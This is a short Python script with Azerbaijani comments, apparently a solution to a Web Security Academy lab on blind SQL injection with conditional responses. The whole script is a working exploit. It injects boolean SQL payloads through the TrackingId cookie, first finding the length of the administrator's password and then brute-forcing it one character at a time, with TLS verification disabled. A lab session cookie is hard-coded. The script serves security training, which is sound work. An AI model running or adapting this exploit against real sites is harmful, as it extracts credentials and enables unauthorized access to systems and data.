"""
Blind SQL Injection - Boolean-based brute force
Lab: Blind SQL injection with conditional responses
Hər simvol üçün: 'Welcome back!' varsa → doğrudur
"""
import requests
import string
import urllib3
urllib3.disable_warnings()

HOST    = "0a7b00740333a61a80b01c370042000b.web-security-academy.net"
SESSION = "PfkG7ogjsIMEj1RXK5gia1sQERFbtah8"
TRACKING= "mORUitwK62SBTBMs"
CHARS   = string.ascii_lowercase + string.digits   # a-z + 0-9
URL     = f"https://{HOST}/"
SIGNAL  = "Welcome back!"

def check(payload: str) -> bool:
    cookies = {
        "TrackingId": TRACKING + payload,
        "session": SESSION,
    }
    r = requests.get(URL, cookies=cookies, verify=False, timeout=10)
    return SIGNAL in r.text

# 1. Şifrenin uzunluğunu tap (maks 30)
print("[*] Şifre uzunluğu axtarılır...")
pwd_len = 0
for n in range(1, 31):
    payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={n})='a"
    if check(payload):
        pwd_len = n
        print(f"[+] Şifre uzunluğu: {pwd_len}")
        break

if not pwd_len:
    print("[-] Uzunluq tapılmadı!")
    exit(1)

# 2. Hər simvolu tap
print("[*] Şifre simvolları brute-force edilir...")
password = ""
for pos in range(1, pwd_len + 1):
    for ch in CHARS:
        payload = (
            f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users"
            f" WHERE username='administrator')='{ch}"
        )
        if check(payload):
            password += ch
            print(f"[+] Pozisiya {pos:2d}: '{ch}'  →  Şifre: {password}", flush=True)
            break
    else:
        print(f"[?] Pozisiya {pos}: simvol tapılmadı!")
        password += "?"

print(f"\n[✓] Tapılan şifre: {password}")
